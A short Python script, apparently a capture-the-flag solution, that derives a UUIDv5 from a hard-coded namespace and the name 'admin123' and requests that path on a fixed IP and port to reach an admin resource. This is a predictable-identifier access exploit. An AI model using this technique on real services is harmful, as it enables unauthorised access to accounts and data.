#!/usr/bin/env python3
import requests
import uuid

leet = uuid.UUID('13371337-1337-1337-1337-133713371337')
uid = uuid.uuid5(leet, 'admin123')

response = requests.get(f'http://24.199.110.35:40150/{uid}')

print(response.text)
